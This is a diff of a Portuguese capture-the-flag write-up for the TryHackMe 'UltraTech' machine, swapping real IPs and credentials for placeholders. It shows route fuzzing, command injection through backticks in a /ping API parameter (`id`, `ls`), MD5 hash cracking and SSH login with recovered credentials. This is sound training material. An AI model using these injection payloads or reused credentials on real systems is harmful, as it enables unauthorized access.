@@ -12,7 +12,7 @@
 |:------|:------|
 | **Máquina** | UltraTech |
 | **Plataforma** | TryHackMe |
-| **IP Alvo** | `***.***.***.***' |
+| **IP Alvo** | `<Ip>' |
 | **Sistema Operacional** | Ubuntu (Linux) |
 | **Dificuldade** | Medium |
 | **Objetivo** | Enumerar serviços, explorar a API REST, obter acesso e escalar para root |
@@ -74,7 +74,7 @@ PORT     STATE SERVICE VERSION
 ### Fuzzing de rotas
 
 ```bash
-ffuf -u http://<**.***.**.**>:8081/FUZZ \
+ffuf -u http://<IP>:8081/FUZZ \
      -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
 ```
 
@@ -108,7 +108,7 @@ Isso confirma que o frontend consome a API na porta 8081, e que `/ping` é acess
 ### 4.1 Erro revelador no `/ping`
 
 ```bash
-curl "http://<**.***.**.**>:8081/ping"
+curl "http://<Ip>:<Porta>/ping"
 ```
 
 **Resultado:**
@@ -129,7 +129,7 @@ TypeError: Cannot read property 'replace' of undefined
 ### 4.2 Injeção de comando com backticks
 
 ```bash
-curl "http://<**.***.**.**>:8081/ping?ip=`id`"
+curl "http://<Ip>:<Porta>/ping?ip=`id`"
 ```
 
 **Resultado:**
@@ -145,7 +145,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ### 4.3 Listagem de arquivos
 
 ```bash
-curl "http://<**.***.**.**>:8081/ping?ip=`ls`"
+curl "http://<IP>:<Porta>/ping?ip=`ls`"
 ```
 
 **Resultado:**
@@ -200,8 +200,8 @@ Para hashes MD5 comuns, o site [crackstation.net](https://crackstation.net/) con
 **Senhas recuperadas:**
 
 ```text
-r00t  →  <senha_encontrada>
-admin →  <senha_encontrada>
+<usuário1>   →  <senha_encontrada>
+<usuário1> →  <senha_encontrada>
 ```
 
 > 💡 **Por que MD5 é inseguro?** MD5 é um algoritmo de hash **rápido** e **sem salt**. Isso permite que GPUs testem bilhões de hashes por segundo. Para armazenamento de senhas, o correto é usar **bcrypt**, **scrypt** ou **Argon2** (lentos e com salt).
@@ -215,7 +215,7 @@ Com as credenciais recuperadas, testamos os serviços expostos.
 ### 6.1 FTP
 
 ```bash
-ftp 10.66.156.242
+ftp <Ip>
 # usuário: r00t
 # senha: <senha_encontrada>
 ```
@@ -225,11 +225,11 @@ O FTP pode permitir upload/download de arquivos. Verificar se há arquivos inter
 ### 6.2 SSH
 
 ```bash
-ssh r00t@10.66.156.242
+ssh <usuário1>@<Ip>
 # senha: <senha_encontrada>
 ```
 
- **Login SSH bem-sucedido** com o usuário `r00t`. Temos acesso inicial ao sistema.
+ **Login SSH bem-sucedido** com o usuário `<Usuario1>`. Temos acesso inicial ao sistema.
 
 ```text
 r00t@ultratech-prod:~$ id
